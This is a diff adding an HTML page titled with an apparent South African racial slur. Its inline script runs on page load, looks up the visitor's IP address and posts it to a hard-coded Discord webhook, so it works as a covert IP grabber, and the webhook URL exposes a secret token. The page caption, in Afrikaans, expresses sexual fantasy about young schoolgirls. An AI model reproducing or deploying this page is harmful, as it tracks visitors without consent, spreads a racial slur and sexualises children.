@@ -1,1 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
 
+    <title>kaffer land</title>
+    <style>
+        body {
+            background-image: url('background.jpg');
+            background-size: cover; /* This will make the image cover the entire background */
+            background-repeat: no-repeat; /* This will prevent the image from repeating */
+            background-attachment: fixed; /* This will keep the background image fixed when scrolling */
+            display: flex;
+            justify-content: center; /* Center horizontally */
+            align-items: center; /* Center vertically */
+            height: 100vh; /* Full viewport height */
+            margin: 0; /* Remove default margin */
+            font-family: Arial, sans-serif; /* Set font to Arial */
+            color: white; /* Set text color to white */
+            text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000; /* Add black outline to text */
+        }
+        .container {
+            position: relative;
+            text-align: center;
+        }
+        .centered-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        img.center {
+            max-width: 80%; /* Increase the max-width to make the image bigger */
+            max-height: 80%; /* Increase the max-height to make the image bigger */
+        }
+        img.below {
+            max-width: 80%; /* Ensure the image doesn't overflow */
+            margin-top: 20px; /* Add some space between the containers */
+        }
+    </style>
+
+</head>
+<body>
+    <div id="ip-address"></div> <!-- Add this line to ensure the element exists -->
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Fetch the IP address from the API
+            fetch("https://ipinfo.io/json") 
+                .then(response => response.json())
+                .then(data => {
+                    // Display the IP address on the screen
+                    document.getElementById("ip-address").textContent = 
+                          `IP Address: ${data.ip}`;
+                    
+                    // Post the IP address to a Discord webhook
+                    fetch("https://discord.com/api/webhooks/1340426410304475189/gjSiFvVXRUpPP_yO1UFbMkvypQeMui2xA0Nr6OnIiKVERZwqE8kgTNKO_hz8f7wTuZmH", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            content: `IP Address: ${data.ip}`
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(result => {
+                        console.log("Successfully posted to Discord webhook:", result);
+                    })
+                    .catch(error => {
+                        console.error("Error posting to Discord webhook:", error);
+                    });
+                })
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                    document.getElementById("ip-address").textContent = 
+                          "Unable to retrieve IP address.";
+                });
+        });
+    </script>
+    
+    <div class="container">
+        <img src="dryson.png" alt="Centered Image" class="center">
+        <div class="centered-text">ek fantaseer oor klein skool meisies</div>
+    </div>
+    <div class="container">
+        <img src="a.png" alt="Second Image" class="below">
+    </div>
+     
+
+</body>
+</html>
